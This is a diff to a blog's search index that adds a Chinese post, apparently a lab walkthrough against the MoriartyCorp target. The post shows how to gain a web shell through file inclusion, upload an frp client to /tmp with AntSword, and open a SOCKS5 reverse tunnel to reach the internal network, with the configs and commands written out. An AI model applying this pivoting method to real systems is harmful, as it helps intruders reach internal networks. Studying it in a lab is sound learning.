@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>内网穿透</title>
+      <link href="/2024/08/14/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%88%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%EF%BC%89/"/>
+      <url>/2024/08/14/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%88%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%EF%BC%89/</url>
+      
+        <content type="html"><![CDATA[<h3 id="1-什么是反向代理"><a href="#1-什么是反向代理" class="headerlink" title="1 什么是反向代理"></a>1 什么是反向代理</h3><p>通过反向代理访问内网资源</p><h3 id="2-方向代理工具-frp"><a href="#2-方向代理工具-frp" class="headerlink" title="2 方向代理工具-frp"></a>2 方向代理工具-frp</h3><p>frp 是一款高性能的<code>反向代理</code>应用，专注于<code>内网穿透</code>。它支持多种协议，包括 TCP、UDP、HTTP、HTTPS 等，并且具备 P2P 通信功能。使用 frp，您可以安全、便捷地将内网服务暴露到公网，通过拥有公网 IP 的节点进行<code>中转</code>。</p><h3 id="3-frp-工作原理"><a href="#3-frp-工作原理" class="headerlink" title="3 frp-工作原理"></a>3 frp-工作原理</h3><p>frp 主要由两个组件组成：客户端(frpc) 和 服务端(frps)。通常情况下，服务端部署在具有公网 IP 地址的机器上，而客户端部署在需要穿透的内网服务所在的机器上。<br>由于内网服务缺乏公网 IP 地址，因此无法直接被非局域网内的用户访问。用户通过访问服务端的 frps，frp 负责根据请求的端口或其他信息将请求路由到相应的内网机器，从而实现通信。</p><h3 id="4-靶场-MoriartyCorp"><a href="#4-靶场-MoriartyCorp" class="headerlink" title="4 靶场-MoriartyCorp"></a>4 靶场-MoriartyCorp</h3><h4 id="4-1-首先拿到网站的shell，通过文件包含漏洞"><a href="#4-1-首先拿到网站的shell，通过文件包含漏洞" class="headerlink" title="4.1 首先拿到网站的shell，通过文件包含漏洞"></a>4.1 首先拿到网站的shell，通过文件包含漏洞</h4><p><img src="https://cdn.nlark.com/yuque/0/2024/png/46258453/1723633607198-ccf1d460-d82a-4b0a-b5ba-c8e7b0a91938.png#averageHue=%23363635&clientId=ued4f7d65-a452-4&from=paste&height=241&id=u2f5495cf&originHeight=331&originWidth=1261&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=27585&status=done&style=none&taskId=u73a9f03e-5c4d-4b3f-87f1-2298ada027d&title=&width=917.0909090909091" alt="image.png"></p><h4 id="4-2-首先配置frp的客户端"><a href="#4-2-首先配置frp的客户端" class="headerlink" title="4.2 首先配置frp的客户端"></a>4.2 首先配置frp的客户端</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = <span class="number">192.168</span><span class="number">.56</span><span class="number">.3</span><span class="comment">//服务器端的地址</span></span><br><span class="line">server_port = <span class="number">21080</span><span class="comment">//s与c的通信端口，这个可以自行设置</span></span><br><span class="line">token = 1qaz<span class="meta">@QWE</span><span class="comment">//token的意思是“令牌”，是服务端生成的一串字符串，作为客户端进行请求的一个标识。</span></span><br><span class="line"></span><br><span class="line">[socks_proxy]</span><br><span class="line">type = tcp<span class="comment">//指定连接协议</span></span><br><span class="line">remote_port = <span class="number">123</span><span class="comment">//指定文件传输端口</span></span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure><h4 id="4-3-服务器端文件配置"><a href="#4-3-服务器端文件配置" class="headerlink" title="4.3 服务器端文件配置"></a>4.3 服务器端文件配置</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = <span class="number">21080</span><span class="comment">//连接端口</span></span><br><span class="line">bind_addr = <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="comment">//监听0.0.0.0所有的都可以连接</span></span><br><span class="line">token = 1qaz<span class="meta">@QWE</span></span><br></pre></td></tr></table></figure><h4 id="4-4-将配置好的文件和frp的客户端通过蚁剑直接传入tmp目录"><a href="#4-4-将配置好的文件和frp的客户端通过蚁剑直接传入tmp目录" class="headerlink" title="4.4 将配置好的文件和frp的客户端通过蚁剑直接传入tmp目录"></a>4.4 将配置好的文件和frp的客户端通过蚁剑直接传入tmp目录</h4><h4 id="4-5-服务器端运行"><a href="#4-5-服务器端运行" class="headerlink" title="4.5 服务器端运行"></a>4.5 服务器端运行</h4><ul><li>找到当前路径，打开cmd，并执行<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\frps.exe -c </span><br></pre></td></tr></table></figure></li></ul><h4 id="4-6-为客户端添加可执行权限-并运行"><a href="#4-6-为客户端添加可执行权限-并运行" class="headerlink" title="4.6 为客户端添加可执行权限,并运行"></a>4.6 为客户端添加可执行权限,并运行</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /tmp/frpc*<span class="comment">//可执行权限</span></span><br><span class="line">/tmp/frpc -c /tmp/frpc.tonl <span class="comment">//后面指定配置文件</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/46252388/1723633012979-048af324-a695-42b3-8b44-bd29a5bec9e9.png?x-oss-process=image/format,webp#averageHue=%23040404&from=url&id=Cfzcg&originHeight=265&originWidth=581&originalType=binary&ratio=1.375&rotation=0&showTitle=false&status=done&style=none&title="></p><h4 id="4-7-当反向代理成功后-，浏览器挂代理-访问内网"><a href="#4-7-当反向代理成功后-，浏览器挂代理-访问内网" class="headerlink" title="4.7 当反向代理成功后 ，浏览器挂代理,访问内网"></a>4.7 当反向代理成功后 ，浏览器挂代理,访问内网</h4><ul><li>端口为信息传输端口</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2024/png/46258453/1723636039152-81cbe099-70fc-4005-8688-a0bf63a7fe29.png#averageHue=%23fbfbfb&clientId=u3a4e4ba6-ef7b-4&from=paste&height=551&id=u185aa7b7&originHeight=757&originWidth=1331&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=47904&status=done&style=none&taskId=u25b94401-a098-4975-8a27-9bdd3cc79a1&title=&width=968" alt="image.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 内网 </category>
+          
+          <category> 反向代理 </category>
+          
+          <category> 内网穿透 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> SQL </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>MySQL基础</title>
       <link href="/2024/07/23/3%20MySQL%E5%9F%BA%E7%A1%80/"/>
       <url>/2024/07/23/3%20MySQL%E5%9F%BA%E7%A1%80/</url>
